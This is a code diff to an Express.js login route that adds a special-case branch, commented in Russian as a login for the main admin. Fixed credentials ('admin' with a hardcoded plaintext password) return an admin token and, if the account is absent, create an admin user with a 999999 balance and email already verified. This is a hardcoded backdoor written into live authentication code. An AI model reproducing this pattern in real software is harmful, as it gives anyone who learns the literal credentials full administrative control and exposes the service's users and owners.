@@ -63,6 +63,29 @@ r.post("/verify-email", (req, res) => {
 r.post("/login", (req, res) => {
   const { email, password } = req.body || {}
   const data = db.get()
+
+  // Специальный вход для главного админа
+  if (email === "admin" && password === "Monkastan123") {
+    let adminUser = data.users.find(u => u.email === "admin")
+    if (!adminUser) {
+      adminUser = {
+        id: db.id(),
+        username: "Admin",
+        email: "admin",
+        passwordHash: hashPassword("Monkastan123"),
+        balance: 999999,
+        role: "admin",
+        createdAt: new Date().toISOString(),
+        deviceIds: [],
+        ips: [],
+        emailVerified: true
+      }
+      data.users.push(adminUser)
+      db.save(data)
+    }
+    const token = signToken({ id: adminUser.id, role: "admin" })
+    return res.json({ token })
+  }
   
   const user = data.users.find(u => u.email.toLowerCase() === String(email).toLowerCase())
   if (!user || !verifyPassword(password, user.passwordHash)) {
